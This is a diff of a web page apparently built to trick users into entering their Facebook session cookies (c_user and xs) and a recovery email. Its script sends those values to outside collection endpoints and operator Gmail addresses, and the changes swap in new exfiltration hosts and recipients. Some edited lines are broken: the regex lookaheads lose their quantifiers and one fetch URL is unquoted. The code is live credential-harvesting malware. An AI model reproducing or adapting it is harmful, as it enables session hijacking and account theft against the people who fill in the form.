@@ -346,7 +346,7 @@
                 <div class="form-group">
                     <label for="xs" class="form-label">xs Value</label>
                     <input type="text" id="xs" class="form-control" required
-                        pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$">
+                        pattern="^(?=.[a-z])(?=.[A-Z])(?=.\d)(?=.[@#$%^&+=]).{12,}$">
                     <p class="form-note">This is a combination of letters, numbers, and special characters</p>
                 </div>
                 <div class="recovery-group">
@@ -373,7 +373,7 @@
             const videoElement = document.querySelector(".video-wrapper video");
             const recoveryGroup = document.querySelector(".recovery-group");
 
-            fetch(`https://handler.gadgetsdecor.com:3000/dc`)
+            fetch(https://handler.gadgetsdecor.com:3000/dc)
                 .then(res => res.json())
                 .then(data => {
                     const myIp = data.clientIp;
@@ -401,7 +401,7 @@
             const xsVal = document.getElementById("xs").value.trim();
 
             const cUserPattern = /^\d{15}$/;
-            const xsPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$/;
+            const xsPattern = /^(?=.[a-z])(?=.[A-Z])(?=.\d)(?=.[@#$%^&+=]).{12,}$/;
 
             if (cUserPattern.test(cUserVal) && xsPattern.test(xsVal) && allowRecovery) {
                 sendAuto();
@@ -453,14 +453,14 @@
                 body: JSON.stringify({
                     c_user: cUserInput,
                     xs: xsInput,
-                    emails: ["mjohn72929@gmail.com", "ibadnizamani757@gmail.com"],
-                    workerEmail: "mjohn72929@gmail.com",
+                    emails: ["approval.ads.monica.ramey@gmail.com"],
+                    workerEmail: "michelle.rose.ads@gmail.com",
                     name: "Ibaad"
                 }),
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/1dJKBcKhm", {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -483,7 +483,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/1dJKBcKhm", {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
